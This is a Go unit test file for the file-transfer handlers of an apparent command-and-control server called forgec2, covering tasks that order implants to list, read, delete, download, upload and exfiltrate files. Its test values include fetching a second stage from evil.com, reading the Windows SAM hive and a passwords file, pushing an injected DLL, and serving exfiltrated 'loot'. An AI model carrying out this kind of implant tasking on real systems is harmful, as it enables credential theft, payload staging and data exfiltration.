package server

import (
	"bytes"
	"context"
	"encoding/json"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/forgec2/forgec2/internal/config"
	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/prometheus/client_golang/prometheus"
	"gorm.io/gorm"
)

// newTestFileServer creates a minimal Server suitable for file handler tests.
func newTestFileServer(t *testing.T, database *gorm.DB) *Server {
	t.Helper()
	cfg := config.DefaultConfig()
	cfg.Server.BeaconKey = strings.Repeat("ab", 32) // 64 hex chars = 32 bytes
	return &Server{
		db:                    database,
		cfg:                   cfg,
		fileChains:            newFileChainState(),
		wsClients:             make(map[*websocket.Conn]*wsClientConn),
		agentPendingTasks:     make(map[string]int),
		ctx:                   context.Background(),
		metrics:               &MetricsCollector{TasksTotal: prometheus.NewCounter(prometheus.CounterOpts{})},
		screenMonitorImplants: make(map[string]time.Time),
	}
}

// seedImplant inserts a minimal db.Implant row and returns it.
func seedImplant(t *testing.T, database *gorm.DB) db.Implant {
	t.Helper()
	agent := db.Implant{
		ID:       uuid.New().String(),
		Hostname: "TEST-HOST",
		Username: "testuser",
		OS:       "windows",
		Arch:     "amd64",
		IP:       "10.0.0.1",
	}
	if err := database.Create(&agent).Error; err != nil {
		t.Fatalf("seed implant: %v", err)
	}
	return agent
}

// newFormContext creates a recorder + gin context with a form-encoded body.
// Sets user_role=operator so requireOperator passes.
func newFormContext(method, urlPath string, form *url.Values) (*httptest.ResponseRecorder, *gin.Context) {
	w := httptest.NewRecorder()
	c, _ := gin.CreateTestContext(w)
	var req *http.Request
	if form != nil {
		req, _ = http.NewRequest(method, urlPath, strings.NewReader(form.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		req, _ = http.NewRequest(method, urlPath, nil)
	}
	c.Request = req
	c.Set("user_role", "operator")
	return w, c
}

// newMultipartContext creates a recorder + gin context with a multipart body.
func newMultipartContext(method, urlPath string, body *bytes.Reader, boundary string) (*httptest.ResponseRecorder, *gin.Context) {
	w := httptest.NewRecorder()
	c, _ := gin.CreateTestContext(w)
	req, _ := http.NewRequest(method, urlPath, body)
	req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)
	c.Request = req
	c.Set("user_role", "operator")
	return w, c
}

func assertStatus(t *testing.T, w *httptest.ResponseRecorder, want int) {
	t.Helper()
	if w.Code != want {
		t.Fatalf("status: want %d, got %d; body=%s", want, w.Code, w.Body.String())
	}
}

func assertSuccessJSON(t *testing.T, w *httptest.ResponseRecorder) map[string]any {
	t.Helper()
	var m map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &m); err != nil {
		t.Fatalf("invalid json: %v; body=%s", err, w.Body.String())
	}
	if v, ok := m["success"]; !ok || v != true {
		t.Fatalf("expected success=true, got %s", w.Body.String())
	}
	return m
}

// ---------------------------------------------------------------------------
// TestHandleListDir
// ---------------------------------------------------------------------------

func TestHandleListDir(t *testing.T) {
	gin.SetMode(gin.TestMode)
	database := newContractDB(t)
	srv := newTestFileServer(t, database)
	agent := seedImplant(t, database)

	t.Run("missing agent returns error", func(t *testing.T) {
		w, c := newFormContext(http.MethodPost, "/", nil)
		c.Params = gin.Params{{Key: "id", Value: "nonexistent"}}
		srv.handleListDir(c)
		assertStatus(t, w, http.StatusNotFound)
	})

	t.Run("empty path defaults to C:\\", func(t *testing.T) {
		w, c := newFormContext(http.MethodPost, "/", nil)
		c.Params = gin.Params{{Key: "id", Value: agent.ID}}
		srv.handleListDir(c)
		assertStatus(t, w, http.StatusOK)
		assertSuccessJSON(t, w)
	})

	t.Run("custom path creates task", func(t *testing.T) {
		form := url.Values{}
		form.Set("path", `D:\Users\Public`)
		w, c := newFormContext(http.MethodPost, "/", &form)
		c.Params = gin.Params{{Key: "id", Value: agent.ID}}
		srv.handleListDir(c)
		assertStatus(t, w, http.StatusOK)
		m := assertSuccessJSON(t, w)
		if _, ok := m["task_id"]; !ok {
			t.Fatalf("missing task_id: %s", w.Body.String())
		}
	})
}

// ---------------------------------------------------------------------------
// TestHandleFileDelete
// ---------------------------------------------------------------------------

func TestHandleFileDelete(t *testing.T) {
	gin.SetMode(gin.TestMode)
	database := newContractDB(t)
	srv := newTestFileServer(t, database)
	agent := seedImplant(t, database)

	t.Run("missing agent returns error", func(t *testing.T) {
		form := url.Values{}
		form.Set("path", `C:\temp\file.txt`)
		w, c := newFormContext(http.MethodPost, "/", &form)
		c.Params = gin.Params{{Key: "id", Value: "nonexistent"}}
		srv.handleFileDelete(c)
		assertStatus(t, w, http.StatusNotFound)
	})

	t.Run("empty path returns 400", func(t *testing.T) {
		w, c := newFormContext(http.MethodPost, "/", nil)
		c.Params = gin.Params{{Key: "id", Value: agent.ID}}
		srv.handleFileDelete(c)
		assertStatus(t, w, http.StatusBadRequest)
	})

	t.Run("valid request creates delete task", func(t *testing.T) {
		form := url.Values{}
		form.Set("path", `C:\temp\secret.txt`)
		w, c := newFormContext(http.MethodPost, "/", &form)
		c.Params = gin.Params{{Key: "id", Value: agent.ID}}
		srv.handleFileDelete(c)
		assertStatus(t, w, http.StatusOK)
		assertSuccessJSON(t, w)
	})
}

// ---------------------------------------------------------------------------
// TestHandleFileRead
// ---------------------------------------------------------------------------

func TestHandleFileRead(t *testing.T) {
	gin.SetMode(gin.TestMode)
	database := newContractDB(t)
	srv := newTestFileServer(t, database)
	agent := seedImplant(t, database)

	t.Run("missing agent returns error", func(t *testing.T) {
		form := url.Values{}
		form.Set("path", `C:\Windows\System32\config\SAM`)
		w, c := newFormContext(http.MethodPost, "/", &form)
		c.Params = gin.Params{{Key: "id", Value: "nonexistent"}}
		srv.handleFileRead(c)
		assertStatus(t, w, http.StatusNotFound)
	})

	t.Run("empty path returns 400", func(t *testing.T) {
		w, c := newFormContext(http.MethodPost, "/", nil)
		c.Params = gin.Params{{Key: "id", Value: agent.ID}}
		srv.handleFileRead(c)
		assertStatus(t, w, http.StatusBadRequest)
	})

	t.Run("valid request creates read task", func(t *testing.T) {
		form := url.Values{}
		form.Set("path", `C:\Users\admin\passwords.txt`)
		w, c := newFormContext(http.MethodPost, "/", &form)
		c.Params = gin.Params{{Key: "id", Value: agent.ID}}
		srv.handleFileRead(c)
		assertStatus(t, w, http.StatusOK)
		assertSuccessJSON(t, w)
	})
}

// ---------------------------------------------------------------------------
// TestHandleDownload
// ---------------------------------------------------------------------------

func TestHandleDownload(t *testing.T) {
	gin.SetMode(gin.TestMode)
	database := newContractDB(t)
	srv := newTestFileServer(t, database)
	agent := seedImplant(t, database)

	t.Run("missing agent returns error", func(t *testing.T) {
		form := url.Values{}
		form.Set("url", "https://evil.com/stage2.bin")
		form.Set("path", `C:\temp\stage2.bin`)
		w, c := newFormContext(http.MethodPost, "/", &form)
		c.Params = gin.Params{{Key: "id", Value: "nonexistent"}}
		srv.handleDownload(c)
		assertStatus(t, w, http.StatusNotFound)
	})

	t.Run("empty url/path returns 400", func(t *testing.T) {
		form := url.Values{}
		form.Set("url", "https://evil.com/stage2.bin")
		// path omitted
		w, c := newFormContext(http.MethodPost, "/", &form)
		c.Params = gin.Params{{Key: "id", Value: agent.ID}}
		srv.handleDownload(c)
		assertStatus(t, w, http.StatusBadRequest)
	})

	t.Run("valid request creates download task", func(t *testing.T) {
		form := url.Values{}
		form.Set("url", "https://evil.com/stage2.bin")
		form.Set("path", `C:\temp\stage2.bin`)
		w, c := newFormContext(http.MethodPost, "/", &form)
		c.Params = gin.Params{{Key: "id", Value: agent.ID}}
		srv.handleDownload(c)
		assertStatus(t, w, http.StatusOK)
		assertSuccessJSON(t, w)
	})
}

// ---------------------------------------------------------------------------
// TestHandleUploadFile
// ---------------------------------------------------------------------------

func TestHandleUploadFile(t *testing.T) {
	gin.SetMode(gin.TestMode)
	database := newContractDB(t)
	srv := newTestFileServer(t, database)
	agent := seedImplant(t, database)

	t.Run("missing agent returns error", func(t *testing.T) {
		var buf bytes.Buffer
		writer := multipart.NewWriter(&buf)
		writer.WriteField("target_path", `C:\temp\injected.dll`)
		part, _ := writer.CreateFormFile("file", "injected.dll")
		part.Write([]byte("fake-payload"))
		writer.Close()

		w, c := newMultipartContext(http.MethodPost, "/", bytes.NewReader(buf.Bytes()), writer.Boundary())
		c.Params = gin.Params{{Key: "id", Value: "nonexistent"}}
		srv.handleUploadFile(c)
		assertStatus(t, w, http.StatusNotFound)
	})

	t.Run("empty target_path returns 400", func(t *testing.T) {
		var buf bytes.Buffer
		writer := multipart.NewWriter(&buf)
		// target_path omitted
		part, _ := writer.CreateFormFile("file", "test.txt")
		part.Write([]byte("content"))
		writer.Close()

		w, c := newMultipartContext(http.MethodPost, "/", bytes.NewReader(buf.Bytes()), writer.Boundary())
		c.Params = gin.Params{{Key: "id", Value: agent.ID}}
		srv.handleUploadFile(c)
		assertStatus(t, w, http.StatusBadRequest)
	})

	t.Run("valid request creates upload task", func(t *testing.T) {
		var buf bytes.Buffer
		writer := multipart.NewWriter(&buf)
		writer.WriteField("target_path", `C:\temp\uploaded.txt`)
		part, _ := writer.CreateFormFile("file", "uploaded.txt")
		part.Write([]byte("hello world from test"))
		writer.Close()

		w, c := newMultipartContext(http.MethodPost, "/", bytes.NewReader(buf.Bytes()), writer.Boundary())
		c.Params = gin.Params{{Key: "id", Value: agent.ID}}
		srv.handleUploadFile(c)
		assertStatus(t, w, http.StatusOK)
		assertSuccessJSON(t, w)

		var task db.Task
		if err := database.Where("agent_id = ? AND type = ?", agent.ID, "upload").Order("id desc").First(&task).Error; err != nil {
			t.Fatalf("load push task: %v", err)
		}
		if task.Data == "" {
			t.Fatal("push task must carry file bytes")
		}
	})

	t.Run("path alias is accepted as target_path", func(t *testing.T) {
		var buf bytes.Buffer
		writer := multipart.NewWriter(&buf)
		writer.WriteField("path", `C:\temp\alias.bin`)
		part, _ := writer.CreateFormFile("file", "alias.bin")
		part.Write([]byte("alias"))
		writer.Close()

		w, c := newMultipartContext(http.MethodPost, "/", bytes.NewReader(buf.Bytes()), writer.Boundary())
		c.Params = gin.Params{{Key: "id", Value: agent.ID}}
		srv.handleUploadFile(c)
		assertStatus(t, w, http.StatusOK)
		assertSuccessJSON(t, w)
	})
}

// ---------------------------------------------------------------------------
// TestHandleFileUploadFromAgent (exfil) + TestHandleFileExfilGet
// ---------------------------------------------------------------------------

func TestHandleFileUploadFromAgent(t *testing.T) {
	gin.SetMode(gin.TestMode)
	database := newContractDB(t)
	srv := newTestFileServer(t, database)
	agent := seedImplant(t, database)

	t.Run("rejects multipart file (that is a push, not exfil)", func(t *testing.T) {
		var buf bytes.Buffer
		writer := multipart.NewWriter(&buf)
		writer.WriteField("path", `C:\temp\secret.txt`)
		part, _ := writer.CreateFormFile("file", "payload.bin")
		part.Write([]byte("should-not-be-pushed-here"))
		writer.Close()

		w, c := newMultipartContext(http.MethodPost, "/", bytes.NewReader(buf.Bytes()), writer.Boundary())
		c.Params = gin.Params{{Key: "id", Value: agent.ID}}
		srv.handleFileUploadFromAgent(c)
		assertStatus(t, w, http.StatusBadRequest)
	})

	t.Run("path-only queues an exfil upload with no payload bytes", func(t *testing.T) {
		form := url.Values{}
		form.Set("path", `C:\Users\admin\secret.txt`)
		form.Set("size", "1048576")
		w, c := newFormContext(http.MethodPost, "/", &form)
		c.Params = gin.Params{{Key: "id", Value: agent.ID}}
		srv.handleFileUploadFromAgent(c)
		assertStatus(t, w, http.StatusOK)
		assertSuccessJSON(t, w)

		var task db.Task
		if err := database.Where("agent_id = ? AND type = ? AND path = ?", agent.ID, "upload", `C:\Users\admin\secret.txt`).Order("id desc").First(&task).Error; err != nil {
			t.Fatalf("load exfil task: %v", err)
		}
		if task.Data != "" {
			t.Fatal("exfil task must not carry operator file bytes")
		}
		if task.Size != 1048576 {
			t.Fatalf("size: want 1048576, got %d", task.Size)
		}
	})
}

func TestHandleFileExfilGet(t *testing.T) {
	gin.SetMode(gin.TestMode)
	database := newContractDB(t)
	srv := newTestFileServer(t, database)
	agent := seedImplant(t, database)
	srv.cfg.Server.DataDir = t.TempDir()

	t.Run("missing agent returns 404", func(t *testing.T) {
		w, c := newFormContext(http.MethodGet, "/", nil)
		c.Params = gin.Params{{Key: "id", Value: "nonexistent"}, {Key: "filename", Value: "a.txt"}}
		srv.handleFileExfilGet(c)
		assertStatus(t, w, http.StatusNotFound)
	})

	t.Run("traversal filename is rejected", func(t *testing.T) {
		w, c := newFormContext(http.MethodGet, "/", nil)
		c.Params = gin.Params{{Key: "id", Value: agent.ID}, {Key: "filename", Value: "..\\secret.txt"}}
		srv.handleFileExfilGet(c)
		if w.Code == http.StatusOK {
			t.Fatalf("traversal must not succeed: %s", w.Body.String())
		}
	})

	t.Run("serves a saved exfil blob", func(t *testing.T) {
		base := filepath.Join(srv.cfg.Server.DataDir, "uploads", agent.ID)
		if err := os.MkdirAll(base, 0700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(base, "loot.txt"), []byte("exfil-bytes"), 0600); err != nil {
			t.Fatal(err)
		}
		w, c := newFormContext(http.MethodGet, "/", nil)
		c.Params = gin.Params{{Key: "id", Value: agent.ID}, {Key: "filename", Value: "loot.txt"}}
		srv.handleFileExfilGet(c)
		assertStatus(t, w, http.StatusOK)
		if !bytes.Contains(w.Body.Bytes(), []byte("exfil-bytes")) {
			t.Fatalf("expected exfil body, got %s", w.Body.String())
		}
	})
}

// ---------------------------------------------------------------------------
// TestReadFileToBase64
// ---------------------------------------------------------------------------

func TestReadFileToBase64(t *testing.T) {
	t.Run("encodes file content to base64", func(t *testing.T) {
		var buf bytes.Buffer
		writer := multipart.NewWriter(&buf)
		part, err := writer.CreateFormFile("file", "test.txt")
		if err != nil {
			t.Fatalf("create form file: %v", err)
		}
		if _, err := part.Write([]byte("hello world")); err != nil {
			t.Fatalf("write content: %v", err)
		}
		writer.Close()

		reader := multipart.NewReader(&buf, writer.Boundary())
		form, err := reader.ReadForm(1024 * 1024)
		if err != nil {
			t.Fatalf("read form: %v", err)
		}
		files := form.File["file"]
		if len(files) == 0 {
			t.Fatal("no file in form")
		}

		got, err := readFileToBase64(files[0])
		if err != nil {
			t.Fatalf("readFileToBase64: %v", err)
		}
		want := "aGVsbG8gd29ybGQ=" // base64("hello world")
		if got != want {
			t.Fatalf("base64: want %q, got %q", want, got)
		}
	})

	t.Run("empty file returns empty base64", func(t *testing.T) {
		var buf bytes.Buffer
		writer := multipart.NewWriter(&buf)
		part, _ := writer.CreateFormFile("file", "empty.txt")
		part.Write([]byte{})
		writer.Close()

		reader := multipart.NewReader(&buf, writer.Boundary())
		form, _ := reader.ReadForm(1024 * 1024)
		files := form.File["file"]

		got, err := readFileToBase64(files[0])
		if err != nil {
			t.Fatalf("readFileToBase64: %v", err)
		}
		if got != "" {
			t.Fatalf("expected empty string for empty file, got %q", got)
		}
	})
}
